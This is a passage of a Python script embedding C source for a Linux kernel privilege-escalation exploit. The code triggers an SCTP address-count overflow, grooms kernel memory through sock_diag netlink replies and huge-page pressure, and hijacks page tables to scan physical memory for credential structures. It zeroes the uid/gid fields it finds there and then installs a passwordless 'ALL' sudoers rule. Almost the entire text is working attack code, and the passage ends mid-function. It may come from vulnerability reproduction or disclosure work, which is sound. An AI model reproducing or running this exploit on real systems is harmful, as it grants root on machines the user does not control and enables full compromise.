#!/usr/bin/env python3
from __future__ import annotations

import os
import platform
import pwd
import shutil
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import NoReturn

C_COMPILER: str = "cc"
ID_BINARY: str = "/usr/bin/id"
SUDO_BINARY: str = "/usr/bin/sudo"
ATTACKER_UID: int = os.getuid()
ATTACKER_GID: int = os.getgid()
ATTACKER_USER: str = pwd.getpwuid(ATTACKER_UID).pw_name
C_SOURCE_PATH: Path = Path(f"/var/tmp/diagspill-root-repro-{ATTACKER_UID}.c")
EXPLOIT_BINARY: Path = Path(f"/tmp/diagspill-root-repro-{ATTACKER_UID}")
SUDOERS_PATH: str = f"/etc/sudoers.d/diagspill-root-repro-{ATTACKER_UID}"


@dataclass(frozen=True)
class TargetProfile:
    name: str
    page_table_pages: int


EXPLOIT_SOURCE: str = r'''#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <linux/futex.h>
#include <linux/inet_diag.h>
#include <linux/netlink.h>
#include <linux/sctp.h>
#include <linux/sock_diag.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef IPPROTO_SCTP
#define IPPROTO_SCTP 132
#endif
#ifndef SOL_SCTP
#define SOL_SCTP 132
#endif
#define SCTP_SOCKOPT_CONNECTX3 111
#define SCTP_INITMSG 2
#define NETLINK_SOCK_DIAG 4
#define SUDO_BINARY "/usr/bin/sudo"
#define SUDOERS_PATH "/etc/sudoers.d/diagspill-root-repro"

#define CREDENTIAL_WORKERS 2048U
#define CREDENTIAL_WORKER_STACK_BYTES (64U << 10)
#define SAFE_PEERS 16384U
#define OVERFLOW_PEERS (65536U + SAFE_PEERS)
#define WALL_BUFFERS 16U
#define CORRIDOR_COUNT 4U
#define TARGET_WALL_INDEX(corridor) (6U + 3U * (corridor))
#define SUCCESSOR_WALL_INDEX(corridor) (TARGET_WALL_INDEX(corridor) - 1U)
#define PAGE_TABLE_WALL_INDEX(corridor) (TARGET_WALL_INDEX(corridor) - 2U)
#define MAX_DIAGNOSTIC_FILLERS 512U
#define DIAGNOSTIC_FAILURE_STREAK 64U

#define HUGE_BYTES (2ULL << 20)
#define HUGE_PAGE_FLAGS 0xa7ULL
#define ONE_GIB (1ULL << 30)
#define LOW_RAM_START HUGE_BYTES
#define LOW_RAM_END (3ULL << 30)
#define HIGH_RAM_START (4ULL << 30)
#define HIGH_RAM_END (5ULL << 30)

#define COMPETING_MEMORY_BASE (64ULL << 30)
#define SACRIFICIAL_BASE (68ULL << 30)
#define MAX_COMPETING_HUGE_PAGES 1024U
#define MAX_SACRIFICIAL_HUGE_PAGES 256U
#define SACRIFICIAL_BYTES \
	((uint64_t)MAX_SACRIFICIAL_HUGE_PAGES * HUGE_BYTES)
#define SACRIFICIAL_MAPPING_BYTES (SACRIFICIAL_BYTES + HUGE_BYTES)

#ifndef PAGE_TABLE_PAGES
#define PAGE_TABLE_PAGES 600000U
#endif
#define ADDRESS_REGION_COUNT 256U
#define TOP_LEVEL_REGION_BYTES (512ULL << 30)
#define ADDRESS_REGION_BYTES (508ULL << 30)
#define CHUNKS_PER_ADDRESS_REGION \
	(ADDRESS_REGION_BYTES / ONE_GIB)
#define MINIMUM_ADDRESS_REGIONS 252U
#define CONTROLLED_ENTRY_FIRST 2U
#define CONTROLLED_ENTRY_LAST 3U
#define PAGE_TABLE_ENTRIES 512U
#define ENTRIES_PER_PEER 16U
#define PEER_ADDRESS_SEED 5057595369945519184ULL

#ifndef CRED_UID
#define CRED_UID 1001ULL
#endif
#ifndef CRED_GID
#define CRED_GID 1001ULL
#endif
#define CRED_PAIR (CRED_UID | (CRED_GID << 32))

struct shared_control {
	_Atomic int epoch;
	_Atomic int ready;
	_Atomic int scan_start;
	_Atomic int mapping_hits;
	_Atomic int candidates;
	_Atomic int winner;
};

struct diag_request {
	int nl;
	struct {
		struct nlmsghdr nlh;
		struct inet_diag_req_v2 req;
	} message;
};

struct connectx_parameter {
	int32_t assoc_id;
	int32_t addr_num;
	struct sockaddr *addrs;
};

struct reply_wall {
	pid_t pid;
	int command_fd;
	int status_fd;
	int target_fds[CORRIDOR_COUNT];
	int successor_fds[CORRIDOR_COUNT];
	int page_table_fds[CORRIDOR_COUNT];
};

struct huge_page_saturation {
	unsigned int attempts;
	unsigned int retained_huge_pages;
	unsigned int allocation_pressure_observed;
};

struct diagnostic_saturation {
	unsigned int retained_replies;
	unsigned int consecutive_failures;
};

struct placement_holder {
	pid_t pid;
	int command_fd;
	int status_fd;
};

struct scanner_argument {
	unsigned char **regions;
	struct shared_control *control;
};

static void breaker(const char *description)
{
	printf("\n***%s***\n", description);
}

static void explain_safe_retry(void)
{
	printf("SCTP overflow triggered: no\n");
	printf("No kernel memory was corrupted. Run the PoC again; if this "
	       "happens again, reboot and retry on a fresh boot.\n");
}

static void report_huge_page_placement_failure(
	const char *stage, struct huge_page_saturation result,
	unsigned int minimum, unsigned int maximum)
{
	breaker("MEMORY PLACEMENT DID NOT CONVERGE");
	printf("placement stage: %s\n", stage);
	printf("two-mebibyte allocation attempts: %u of %u allowed\n",
	       result.attempts, maximum);
	printf("two-mebibyte pages retained: %u; minimum required: %u\n",
	       result.retained_huge_pages, minimum);
	printf("ordinary-page fallback observed: %s\n",
	       result.allocation_pressure_observed ? "yes" : "no");
	explain_safe_retry();
}

static void pin_cpu(unsigned int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET((int)cpu, &set);
	if (sched_setaffinity(0, sizeof(set), &set) < 0) {
		perror("could not select an exploit CPU");
		_exit(1);
	}
}

static int write_all(int fd, const void *data, size_t length)
{
	const unsigned char *cursor = data;

	while (length) {
		ssize_t wrote = write(fd, cursor, length);

		if (wrote <= 0) {
			if (errno == EINTR)
				continue;
			return -1;
		}
		cursor += wrote;
		length -= (size_t)wrote;
	}
	return 0;
}

static int futex_wait_value(_Atomic int *address, int value)
{
	return (int)syscall(SYS_futex, address, FUTEX_WAIT, value,
			    NULL, NULL, 0);
}

static int futex_wake_all(_Atomic int *address)
{
	return (int)syscall(SYS_futex, address, FUTEX_WAKE, INT_MAX,
			    NULL, NULL, 0);
}

static struct shared_control *map_control(void)
{
	return mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
}

static uint64_t splitmix64(uint64_t value)
{
	value += 0x9e3779b97f4a7c15ULL;
	value = (value ^ (value >> 30)) * 0xbf58476d1ce4e5b9ULL;
	value = (value ^ (value >> 27)) * 0x94d049bb133111ebULL;
	return value ^ (value >> 31);
}

static uint64_t physical_for_peer(uint64_t peer)
{
	const uint64_t low_chunks =
		(LOW_RAM_END - LOW_RAM_START) / HUGE_BYTES;
	const uint64_t high_chunks =
		(HIGH_RAM_END - HIGH_RAM_START) / HUGE_BYTES;
	uint64_t chunk = splitmix64(peer ^ PEER_ADDRESS_SEED) %
			 (low_chunks + high_chunks);

	if (chunk < low_chunks)
		return LOW_RAM_START + chunk * HUGE_BYTES;
	return HIGH_RAM_START + (chunk - low_chunks) * HUGE_BYTES;
}

static struct sockaddr_in6 *make_peers(uint16_t port, unsigned int count)
{
	struct sockaddr_in6 *peers = calloc(count, sizeof(*peers));

	if (!peers)
		return NULL;
	for (uint32_t index = 0; index < count; index++) {
		uint64_t first = physical_for_peer(2ULL * index) |
			HUGE_PAGE_FLAGS;
		uint64_t second = physical_for_peer(2ULL * index + 1ULL) |
			HUGE_PAGE_FLAGS;
		uint32_t payload[6] = {
			0,
			htonl(index + 1U),
			(uint32_t)first,
			(uint32_t)(first >> 32),
			(uint32_t)second,
			(uint32_t)(second >> 32),
		};

		peers[index].sin6_family = AF_INET6;
		peers[index].sin6_port = htons(port);
		memcpy((unsigned char *)&peers[index] + sizeof(uint32_t),
		       payload, sizeof(payload));
	}
	return peers;
}

static int connectx_many(int fd, struct sockaddr_in6 *peers,
			 unsigned int count)
{
	struct sctp_initmsg init = {
		.sinit_max_attempts = 255,
		.sinit_max_init_timeo = 60000,
	};
	struct connectx_parameter parameter = {
		.addr_num = (int32_t)((size_t)count * sizeof(*peers)),
		.addrs = (struct sockaddr *)peers,
	};
	socklen_t option_length = sizeof(parameter);
	int result;
	int saved_errno;

	if (setsockopt(fd, IPPROTO_SCTP, SCTP_INITMSG, &init, sizeof(init)) < 0)
		return -1;
	errno = 0;
	result = getsockopt(fd, SOL_SCTP, SCTP_SOCKOPT_CONNECTX3,
			    &parameter, &option_length);
	saved_errno = errno;
	printf("SCTP association addresses supplied: %u\n", count);
	printf("SCTP address count retained by the 16-bit field: %u\n",
	       count & UINT16_MAX);
	printf("SCTP association setup: %s; association identifier: %d\n",
	       result == 0 ? "completed" :
	       saved_errno == EINPROGRESS ? "in progress as expected" :
	       strerror(saved_errno),
	       parameter.assoc_id);
	return result == 0 || saved_errno == EINPROGRESS ? 0 : -1;
}

static struct diag_request prepare_diag(int sctp_fd,
					const struct sockaddr_in6 *peer)
{
	struct diag_request request = {.nl = -1};
	struct sockaddr_in6 local = {0};
	socklen_t local_length = sizeof(local);

	request.nl = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC,
			    NETLINK_SOCK_DIAG);
	if (request.nl < 0 ||
	    getsockname(sctp_fd, (struct sockaddr *)&local, &local_length) < 0)
		return request;
	request.message.nlh.nlmsg_len = sizeof(request.message);
	request.message.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
	request.message.nlh.nlmsg_flags = NLM_F_REQUEST;
	request.message.nlh.nlmsg_seq = 0x1001;
	request.message.req.sdiag_family = AF_INET6;
	request.message.req.sdiag_protocol = IPPROTO_SCTP;
	request.message.req.idiag_states = UINT32_MAX;
	request.message.req.id.idiag_sport = local.sin6_port;
	request.message.req.id.idiag_dport = peer->sin6_port;
	memcpy(request.message.req.id.idiag_src, &local.sin6_addr,
	       sizeof(local.sin6_addr));
	memcpy(request.message.req.id.idiag_dst, &peer->sin6_addr,
	       sizeof(peer->sin6_addr));
	request.message.req.id.idiag_cookie[0] = INET_DIAG_NOCOOKIE;
	request.message.req.id.idiag_cookie[1] = INET_DIAG_NOCOOKIE;
	return request;
}

static int queue_diag_reply(struct diag_request *request)
{
	unsigned char byte;
	ssize_t queued;

	if (send(request->nl, &request->message,
		 sizeof(request->message), 0) != (ssize_t)sizeof(request->message))
		return -1;
	for (unsigned int attempt = 0; attempt < 1000U; attempt++) {
		queued = recv(request->nl, &byte, sizeof(byte),
			      MSG_PEEK | MSG_TRUNC | MSG_DONTWAIT);
		if (queued > 0)
			return queued >= 2097152 ? 0 : -1;
		usleep(1000);
	}
	return -1;
}

static struct diagnostic_saturation saturate_diag_replies(
	int sctp_fd, const struct sockaddr_in6 *peer,
	struct diag_request *retained)
{
	struct diagnostic_saturation result = {0, 0};

	(void)prctl(PR_SET_NAME, "diag_fill", 0, 0, 0);
	while (result.retained_replies < MAX_DIAGNOSTIC_FILLERS &&
	       result.consecutive_failures < DIAGNOSTIC_FAILURE_STREAK) {
		struct diag_request request = prepare_diag(sctp_fd, peer);

		if (request.nl >= 0 && queue_diag_reply(&request) == 0) {
			retained[result.retained_replies++] = request;
			result.consecutive_failures = 0;
			continue;
		}
		if (request.nl >= 0)
			close(request.nl);
		result.consecutive_failures++;
	}
	return result;
}

static int send_request_fd(int socket_fd, struct diag_request *request)
{
	char control[CMSG_SPACE(sizeof(int))] = {0};
	struct iovec iovec = {
		.iov_base = request,
		.iov_len = sizeof(*request),
	};
	struct msghdr message = {
		.msg_iov = &iovec,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	struct cmsghdr *header = CMSG_FIRSTHDR(&message);

	if (!header)
		return -1;
	header->cmsg_level = SOL_SOCKET;
	header->cmsg_type = SCM_RIGHTS;
	header->cmsg_len = CMSG_LEN(sizeof(int));
	memcpy(CMSG_DATA(header), &request->nl, sizeof(request->nl));
	return sendmsg(socket_fd, &message, 0) == (ssize_t)sizeof(*request) ?
		0 : -1;
}

static int receive_request_fd(int socket_fd, struct diag_request *request)
{
	char control[CMSG_SPACE(sizeof(int))] = {0};
	struct iovec iovec = {
		.iov_base = request,
		.iov_len = sizeof(*request),
	};
	struct msghdr message = {
		.msg_iov = &iovec,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	struct cmsghdr *header;

	if (recvmsg(socket_fd, &message, 0) != (ssize_t)sizeof(*request))
		return -1;
	header = CMSG_FIRSTHDR(&message);
	if (!header || header->cmsg_level != SOL_SOCKET ||
	    header->cmsg_type != SCM_RIGHTS ||
	    header->cmsg_len != CMSG_LEN(sizeof(int)))
		return -1;
	memcpy(&request->nl, CMSG_DATA(header), sizeof(request->nl));
	return 0;
}

static int release_queued_replies(const int reply_fds[CORRIDOR_COUNT])
{
	unsigned char byte;

	for (unsigned int corridor = 0; corridor < CORRIDOR_COUNT;
	     corridor++) {
		if (reply_fds[corridor] < 0 ||
		    recv(reply_fds[corridor], &byte, sizeof(byte),
			 MSG_DONTWAIT) < 0)
			return -1;
	}
	return 0;
}

static int trigger_diag(
	struct diag_request *request,
	const int queued_reply_fds[CORRIDOR_COUNT])
{
	ssize_t sent;

	pin_cpu(0);
	if (release_queued_replies(queued_reply_fds) < 0)
		return -1;
	sent = send(request->nl, &request->message,
		    sizeof(request->message), 0);
	if (sent < 0)
		printf("diagnostic request failed: %s\n", strerror(errno));
	else
		printf("diagnostic request bytes sent: %zd\n", sent);
	return sent < 0 ? -1 : 0;
}

static void reply_wall_child(int command_fd, int status_fd)
{
	struct diag_request *requests =
		calloc(WALL_BUFFERS, sizeof(*requests));
	struct diag_request *fillers =
		calloc(MAX_DIAGNOSTIC_FILLERS, sizeof(*fillers));
	struct sockaddr_in6 *peers =
		make_peers(45679U, SAFE_PEERS);
	struct diagnostic_saturation saturation;
	unsigned int count = 0;
	char command;
	int sctp_fd;

	if (!requests || !fillers || !peers)
		_exit(2);
	pin_cpu(0);
	(void)prctl(PR_SET_NAME, "diag_wall", 0, 0, 0);
	sctp_fd = socket(AF_INET6, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC,
			 IPPROTO_SCTP);
	if (sctp_fd < 0 || connectx_many(sctp_fd, peers, SAFE_PEERS) < 0)
		_exit(3);
	for (unsigned int index = 0; index < WALL_BUFFERS; index++) {
		requests[index] = prepare_diag(sctp_fd, &peers[0]);
		if (requests[index].nl < 0 ||
		    queue_diag_reply(&requests[index]) < 0)
			break;
		count++;
	}
	if (write(status_fd, &count, sizeof(count)) != sizeof(count))
		_exit(4);
	if (count != WALL_BUFFERS)
		_exit(5);
	for (unsigned int corridor = 0; corridor < CORRIDOR_COUNT;
	     corridor++) {
		if (send_request_fd(
			    status_fd,
			    &requests[TARGET_WALL_INDEX(corridor)]) < 0 ||
		    send_request_fd(
			    status_fd,
			    &requests[SUCCESSOR_WALL_INDEX(corridor)]) < 0 ||
		    send_request_fd(
			    status_fd,
			    &requests[PAGE_TABLE_WALL_INDEX(corridor)]) < 0)
			_exit(5);
	}
	if (read(command_fd, &command, 1) != 1 || command != 'F')
		_exit(6);
	saturation = saturate_diag_replies(sctp_fd, &peers[0], fillers);
	if (write(status_fd, &saturation, sizeof(saturation)) !=
	    sizeof(saturation))
		_exit(7);
	for (;;)
		pause();
}

static struct reply_wall start_reply_wall(void)
{
	struct reply_wall wall = {
		.pid = -1,
		.command_fd = -1,
		.status_fd = -1,
	};
	struct diag_request target_request;
	int command_pipe[2];
	int status_pipe[2];
	unsigned int count = 0;

	for (unsigned int corridor = 0; corridor < CORRIDOR_COUNT;
	     corridor++) {
		wall.target_fds[corridor] = -1;
		wall.successor_fds[corridor] = -1;
		wall.page_table_fds[corridor] = -1;
	}
	if (pipe2(command_pipe, O_CLOEXEC) < 0 ||
	    socketpair(AF_UNIX, SOCK_SEQPACKET | SOCK_CLOEXEC,
		       0, status_pipe) < 0)
		return wall;
	wall.pid = fork();
	if (wall.pid < 0)
		return wall;
	if (!wall.pid) {
		close(command_pipe[1]);
		close(status_pipe[0]);
		(void)prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
		if (getppid() == 1)
			_exit(8);
		reply_wall_child(command_pipe[0], status_pipe[1]);
	}
	close(command_pipe[0]);
	close(status_pipe[1]);
	wall.command_fd = command_pipe[1];
	wall.status_fd = status_pipe[0];
	if (read(wall.status_fd, &count, sizeof(count)) != sizeof(count) ||
	    count != WALL_BUFFERS)
		goto fail;
	for (unsigned int corridor = 0; corridor < CORRIDOR_COUNT;
	     corridor++) {
		if (receive_request_fd(wall.status_fd, &target_request) < 0)
			goto fail;
		wall.target_fds[corridor] = target_request.nl;
		if (receive_request_fd(wall.status_fd, &target_request) < 0)
			goto fail;
		wall.successor_fds[corridor] = target_request.nl;
		if (receive_request_fd(wall.status_fd, &target_request) < 0)
			goto fail;
		wall.page_table_fds[corridor] = target_request.nl;
	}
	return wall;

fail:
	(void)kill(wall.pid, SIGKILL);
	wall.pid = -1;
	return wall;
}

static void overflow_network_child(int status_fd)
{
	struct sockaddr_in6 *peers =
		make_peers(45678U, OVERFLOW_PEERS);
	struct diag_request request;
	int sctp_fd;

	(void)prctl(PR_SET_NAME, "network_setup", 0, 0, 0);
	if (!peers)
		_exit(2);
	sctp_fd = socket(AF_INET6, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC,
			 IPPROTO_SCTP);
	if (sctp_fd < 0 || connectx_many(sctp_fd, peers, OVERFLOW_PEERS) < 0)
		_exit(3);
	request = prepare_diag(sctp_fd, &peers[0]);
	if (request.nl < 0 || send_request_fd(status_fd, &request) < 0)
		_exit(4);
	for (;;)
		pause();
}

static pid_t start_overflow_network(int *status_fd)
{
	int sockets[2];
	pid_t child;

	if (socketpair(AF_UNIX, SOCK_SEQPACKET | SOCK_CLOEXEC, 0, sockets) < 0)
		return -1;
	child = fork();
	if (child < 0)
		return -1;
	if (!child) {
		close(sockets[0]);
		(void)prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
		if (getppid() == 1)
			_exit(5);
		overflow_network_child(sockets[1]);
	}
	close(sockets[1]);
	*status_fd = sockets[0];
	return child;
}

static void install_root_policy(struct shared_control *control)
{
	static const char sudoers_rule[] =
		"attacker ALL=(ALL:ALL) NOPASSWD: ALL\n";
	int expected = 0;
	int fd;

	if (geteuid() != 0)
		return;
	if (!atomic_compare_exchange_strong_explicit(
		    &control->winner, &expected, 3,
		    memory_order_acq_rel, memory_order_acquire))
		return;
	(void)unlink(SUDOERS_PATH);
	fd = open(SUDOERS_PATH,
		  O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC | O_NOFOLLOW, 0440);
	if (fd < 0) {
		atomic_store_explicit(&control->winner, 0, memory_order_release);
		return;
	}
	if (write_all(fd, sudoers_rule, sizeof(sudoers_rule) - 1U) < 0 ||
	    fchmod(fd, 0440) < 0 || fsync(fd) < 0)
		goto fail;
	if (close(fd) < 0) {
		fd = -1;
		goto fail;
	}
	atomic_store_explicit(&control->winner, 1, memory_order_release);
	for (;;)
		pause();

fail:
	if (fd >= 0)
		close(fd);
	(void)unlink(SUDOERS_PATH);
	atomic_store_explicit(&control->winner, 0, memory_order_release);
}

static int credential_worker(void *opaque)
{
	struct shared_control *control = opaque;
	int epoch;

	(void)prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
	if (getppid() == 1)
		return 2;
	(void)prctl(PR_SET_NAME, "cred_worker", 0, 0, 0);
	pin_cpu(2U + ((unsigned int)getpid() % 2U));
	atomic_fetch_add_explicit(&control->ready, 1, memory_order_release);
	futex_wake_all(&control->ready);
	epoch = atomic_load_explicit(&control->epoch, memory_order_acquire);
	for (;;) {
		if (geteuid() == 0)
			install_root_policy(control);
		(void)futex_wait_value(&control->epoch, epoch);
		epoch = atomic_load_explicit(&control->epoch,
					     memory_order_acquire);
	}
}

static unsigned int spawn_credential_workers(struct shared_control *control)
{
	const int clone_flags = CLONE_VM | CLONE_FS | CLONE_FILES |
		CLONE_SIGHAND | SIGCHLD;
	size_t stacks_length =
		(size_t)CREDENTIAL_WORKERS * CREDENTIAL_WORKER_STACK_BYTES;
	unsigned char *stacks = mmap(
		NULL, stacks_length, PROT_READ | PROT_WRITE,
		MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE | MAP_STACK,
		-1, 0);
	unsigned int started = 0;

	if (stacks == MAP_FAILED ||
	    madvise(stacks, stacks_length, MADV_NOHUGEPAGE) < 0)
		return 0;
	for (unsigned int index = 0; index < CREDENTIAL_WORKERS; index++) {
		unsigned char *stack_top = stacks +
			(size_t)(index + 1U) * CREDENTIAL_WORKER_STACK_BYTES;
		int child;

		if (prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0) < 0 ||
		    prctl(PR_SET_KEEPCAPS, 0, 0, 0, 0) < 0)
			break;
		child = clone(credential_worker, stack_top, clone_flags, control);
		if (child < 0)
			break;
		started++;
	}
	for (unsigned int attempt = 0; attempt < 400U; attempt++) {
		if ((unsigned int)atomic_load_explicit(
			    &control->ready, memory_order_acquire) >= started)
			break;
		usleep(25000);
	}
	if ((unsigned int)atomic_load_explicit(
		    &control->ready, memory_order_acquire) != started)
		return 0;
	return started;
}

static bool address_is_resident(unsigned char *address)
{
	unsigned char residency = 0;

	return mincore(address, 4096U, &residency) == 0 &&
		(residency & 1U) != 0;
}

static void scan_physical_window(unsigned char *window,
				 unsigned int window_index,
				 struct shared_control *control)
{
	for (size_t page_offset = 0;
	     page_offset < HUGE_BYTES &&
	     atomic_load_explicit(&control->winner, memory_order_acquire) != 1;
	     page_offset += 4096U) {
		volatile uint64_t *page =
			(volatile uint64_t *)(window + page_offset);

		for (size_t offset = 1; offset + 8 < 4096U / sizeof(uint64_t);
		     offset += 8) {
			volatile uint64_t *candidate = page + offset;
			uint64_t usage;

			if (candidate[0] != CRED_PAIR ||
			    candidate[1] != CRED_PAIR ||
			    candidate[2] != CRED_PAIR ||
			    candidate[3] != CRED_PAIR)
				continue;
			usage = candidate[-1];
			if (!usage || usage > 0x100000ULL ||
			    candidate[4] != 0 || candidate[5] != 0 ||
			    candidate[6] != 0 || candidate[7] != 0)
				continue;
			candidate[0] = 0;
			candidate[1] = 0;
			candidate[2] = 0;
			candidate[3] = 0;
			atomic_thread_fence(memory_order_seq_cst);
			printf("possibly-credential object changed in memory window %u "
			       "at byte offset 0x%zx\n", window_index,
			       page_offset + offset * sizeof(uint64_t));
			atomic_fetch_add_explicit(&control->candidates, 1,
						 memory_order_release);
			atomic_fetch_add_explicit(&control->epoch, 1,
						 memory_order_release);
			futex_wake_all(&control->epoch);
			for (;;) {
				int winner = atomic_load_explicit(
					&control->winner, memory_order_acquire);

				if (winner == 1)
					return;
				if (winner == 0)
					break;
				usleep(1000);
			}
		}
	}
}

static void scan_address_regions(struct scanner_argument *argument)
{
	for (unsigned int slot = 1;
	     slot + 1U < ADDRESS_REGION_COUNT &&
	     atomic_load_explicit(&argument->control->winner,
				  memory_order_acquire) != 1;
	     slot++) {
		unsigned char *region = argument->regions[slot];

		if (!region)
			continue;
		for (uint64_t chunk = 0;
		     chunk < CHUNKS_PER_ADDRESS_REGION &&
		     atomic_load_explicit(&argument->control->winner,
					  memory_order_acquire) != 1;
		     chunk++) {
			unsigned char *chunk_base = region + chunk * ONE_GIB;

			for (unsigned int phase = CONTROLLED_ENTRY_FIRST;
			     phase <= CONTROLLED_ENTRY_LAST; phase++) {
				unsigned char *probe = chunk_base +
					(size_t)phase * HUGE_BYTES;

				if (!address_is_resident(probe))
					continue;
				for (unsigned int entry = phase;
				     entry < PAGE_TABLE_ENTRIES;
				     entry += ENTRIES_PER_PEER) {
					unsigned char *window = chunk_base +
						(size_t)entry * HUGE_BYTES;
					int hit;

					if (!address_is_resident(window))
						continue;
					hit = atomic_fetch_add_explicit(
						&argument->control->mapping_hits, 1,
						memory_order_release) + 1;
					if (hit <= 8)
						printf("physical-memory window %d "
						       "opened through address "
						       "region %u\n", hit, slot);
					scan_physical_window(
						window, (unsigned int)hit,
						argument->control);
					if (atomic_load_explicit(
						    &argument->control->winner,
						    memory_order_acquire) == 1)
						return;
				}
			}
		}
	}
}

static void *credential_scanner(void *opaque)
{
	struct scanner_argument *argument = opaque;

	(void)prctl(PR_SET_NAME, "cred_scanner", 0, 0, 0);
	pin_cpu(1U);
	while (!atomic_load_explicit(&argument->control->scan_start,
				     memory_order_acquire))
		(void)futex_wait_value(&argument->control->scan_start, 0);
	scan_address_regions(argument);
	while (atomic_load_explicit(&argument->control->winner,
				    memory_order_acquire) != 1)
		pause();
	return NULL;
}

static long anonymous_huge_kib(const unsigned char *address)
{
	char line[256];
	unsigned long start;
	unsigned long end;
	long huge_kib = -1;
	bool matching = false;
	FILE *smaps = fopen("/proc/self/smaps", "re");

	if (!smaps)
		return -1;
	while (fgets(line, sizeof(line), smaps)) {
		if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
			unsigned long value = (unsigned long)(uintptr_t)address;

			matching = value >= start && value < end;
			continue;
		}
		if (matching &&
		    sscanf(line, "AnonHugePages: %ld kB", &huge_kib) == 1)
			break;
	}
	fclose(smaps);
	return huge_kib;
}

static unsigned char *prepare_sacrificial_mapping(void)
{
	unsigned char *mapping = mmap(
		(void *)(uintptr_t)SACRIFICIAL_BASE,
		SACRIFICIAL_MAPPING_BYTES, PROT_READ | PROT_WRITE,
		MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE |
		MAP_FIXED_NOREPLACE, -1, 0);

	if (mapping == MAP_FAILED ||
	    madvise(mapping, SACRIFICIAL_BYTES, MADV_HUGEPAGE) < 0 ||
	    madvise(mapping + SACRIFICIAL_BYTES, HUGE_BYTES,
		    MADV_NOHUGEPAGE) < 0) {
		if (mapping != MAP_FAILED)
			(void)munmap(mapping, SACRIFICIAL_MAPPING_BYTES);
		return MAP_FAILED;
	}
	mapping[SACRIFICIAL_BYTES] = 1;
	return mapping;
}

static unsigned char *prepare_competing_memory(void)
{
	unsigned char *mapping = mmap(
		(void *)(uintptr_t)COMPETING_MEMORY_BASE,
		(size_t)MAX_COMPETING_HUGE_PAGES * HUGE_BYTES,
		PROT_READ | PROT_WRITE,
		MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE |
		MAP_FIXED_NOREPLACE, -1, 0);

	if (mapping == MAP_FAILED ||
	    madvise(mapping,
		      (size_t)MAX_COMPETING_HUGE_PAGES * HUGE_BYTES,
		      MADV_HUGEPAGE) < 0) {
		if (mapping != MAP_FAILED)
			(void)munmap(mapping,
				     (size_t)MAX_COMPETING_HUGE_PAGES *
				     HUGE_BYTES);
		return MAP_FAILED;
	}
	return mapping;
}

static struct huge_page_saturation retain_huge_pages_until_fallback(
	unsigned char *mapping, unsigned int maximum)
{
	struct huge_page_saturation result = {0, 0, 0};

	while (result.attempts < maximum &&
	       (!result.allocation_pressure_observed ||
		result.retained_huge_pages < 2U)) {
		long huge_kib;

		mapping[(size_t)result.attempts * HUGE_BYTES] =
			(unsigned char)(result.attempts + 1U);
		result.attempts++;
		huge_kib = anonymous_huge_kib(mapping);
		if (huge_kib >=
		    (long)(result.retained_huge_pages + 1U) * 2048L) {
			result.retained_huge_pages++;
		} else {
			result.allocation_pressure_observed = 1;
		}
	}
	return result;
}

static struct huge_page_saturation saturate_competing_huge_pages(
	unsigned char *mapping)
{
	(void)prctl(PR_SET_NAME, "sac_memory", 0, 0, 0);
	return retain_huge_pages_until_fallback(
		mapping, MAX_COMPETING_HUGE_PAGES);
}

static struct huge_page_saturation fill_sacrificial_mapping(
	unsigned char *mapping, const int reply_fds[CORRIDOR_COUNT])
{
	struct huge_page_saturation result = {0, 0, 0};

	(void)prctl(PR_SET_NAME, "sac_data", 0, 0, 0);
	if (release_queued_replies(reply_fds) < 0)
		return result;
	return retain_huge_pages_until_fallback(
		mapping, MAX_SACRIFICIAL_HUGE_PAGES);
}

static long read_vm_pte_kib(void)
{
	char line[256];
	long kib = -1;
	FILE *status = fopen("/proc/self/status", "re");

	if (!status)
		return -1;
	while (fgets(line, sizeof(line), status)) {
		if (sscanf(line, "VmPTE: %ld kB", &kib) == 1)
			break;
	}
	fclose(status);
	return kib;
}

static void read_zero_page(unsigned char *address)
{
	volatile unsigned char value = *address;

	(void)value;
}

static int build_page_table_reservoir(
	unsigned char *const regions[ADDRESS_REGION_COUNT],
	unsigned int region_count, long baseline_vm_pte_kib,
	long *reserved_vm_pte_kib)
{
	uint64_t expected_pages =
		(uint64_t)region_count *
		(1ULL + 2ULL * CHUNKS_PER_ADDRESS_REGION);
	uint64_t remaining;
	long current_vm_pte_kib;

	if (baseline_vm_pte_kib < 0 || expected_pages > PAGE_TABLE_PAGES)
		return -1;
	for (unsigned int slot = 1; slot + 1U < ADDRESS_REGION_COUNT; slot++) {
		if (!regions[slot])
			continue;
		for (uint64_t chunk = 0;
		     chunk < CHUNKS_PER_ADDRESS_REGION; chunk++)
			read_zero_page(regions[slot] + chunk * ONE_GIB);
	}
	remaining = PAGE_TABLE_PAGES - expected_pages;
	for (unsigned int slot = 1;
	     slot + 1U < ADDRESS_REGION_COUNT && remaining;
	     slot++) {
		if (!regions[slot])
			continue;
		for (uint64_t chunk = 0;
		     chunk < CHUNKS_PER_ADDRESS_REGION && remaining;
		     chunk++) {
			unsigned char *chunk_base =
				regions[slot] + chunk * ONE_GIB;

